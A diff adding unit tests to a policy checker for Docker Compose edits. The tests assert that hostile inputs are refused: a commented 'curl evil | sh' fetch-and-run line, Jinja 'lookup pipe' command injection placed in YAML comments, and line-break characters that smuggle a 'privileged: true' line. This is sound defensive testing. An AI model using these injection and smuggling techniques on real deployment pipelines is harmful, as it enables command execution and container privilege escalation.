@@ -209,8 +209,50 @@ class ComposeTests(unittest.TestCase):
     def test_block_scalar_refused(self):
         head = edit(COMPOSE, "        echo memory: 1G", "        echo memory: 2G")
         self.assertFalse(evaluate({C: (COMPOSE, head)}).eligible)
-        head = edit(COMPOSE, "        # tune", "        # tune\n        # curl evil | sh")
-        self.assertFalse(evaluate({C: (COMPOSE, head)}).eligible)
+        # with an allowed change alongside, so only the block check can refuse it
+        bump = edit(COMPOSE, "memory: 128M", "memory: 192M")
+        self.assertTrue(evaluate({C: (COMPOSE, bump)}).eligible)
+        for old, new in (("        # tune", "        # tune\n        # curl evil | sh"),
+                         ("        # tune", "        # retune"),
+                         ("        # tune\n", "")):
+            with self.subTest(new=new):
+                v = evaluate({C: (COMPOSE, edit(bump, old, new))})
+                self.assertFalse(v.eligible)
+                self.assertRegex(" ".join(v.reasons), "block scalar|lines other than comments")
+
+    def test_block_scalar_forms(self):
+        lines = ["    command:", "      - |", "        # a", "    entrypoint: &ep >-", "      # b",
+                 "    x: !!str |", "      # c", "    y: [a, b]", "    # d"]
+        self.assertEqual(botconfig._block_lines(lines), {2, 4, 6})
+
+    def test_jinja_in_trailing_comment_refused(self):
+        # Ansible renders the compose file with Jinja before Docker parses the
+        # YAML, so a `{{ ... }}` in a YAML comment runs on the deploy runner.
+        for old, new in (("ND_LOGLEVEL=info", "ND_LOGLEVEL=debug # {{ lookup('pipe', 'id') }}"),
+                         ("ND_LOGLEVEL=info", "ND_LOGLEVEL=debug  # {% if true %}{% endif %}"),
+                         ("memory: 128M", "memory: 192M # {# x #}")):
+            with self.subTest(new=new):
+                v = evaluate({C: (COMPOSE, edit(COMPOSE, old, new))})
+                self.assertFalse(v.eligible)
+                self.assertIn("Jinja", " ".join(v.reasons))
+
+    def test_line_break_smuggling_refused(self):
+        # "\r" (and NEL/LS/PS for YAML 1.1) start a new line for Jinja/YAML but
+        # not for the line-by-line policy: the "comment" below is really a
+        # `privileged: true` line in the rendered file.
+        bump = edit(COMPOSE, "memory: 128M", "memory: 192M")
+        for brk in ("\r", "\x85", "\u2028", "\u2029", "\x0b", "\x0c", "\x1c"):
+            smuggled = f"    # tune{brk}    privileged: true"
+            for name, head in (
+                    ("comment", edit(bump, "    deploy:\n      resources:\n        limits:\n          memory: 192M",
+                                     f"{smuggled}\n    deploy:\n      resources:\n        limits:\n"
+                                     "          memory: 192M")),
+                    ("resource comment", edit(COMPOSE, "memory: 128M", f"memory: 192M #{smuggled}")),
+                    ("log level comment", edit(COMPOSE, "ND_LOGLEVEL=info", f"ND_LOGLEVEL=debug #{smuggled}"))):
+                with self.subTest(brk=repr(brk), where=name):
+                    v = evaluate({C: (COMPOSE, head)})
+                    self.assertFalse(v.eligible)
+                    self.assertIn("line break", " ".join(v.reasons))
 
     def test_denied_services(self):
         for old, new in (("memory: 512M", "memory: 600M"), ("memory: 4G", "memory: 6G")):
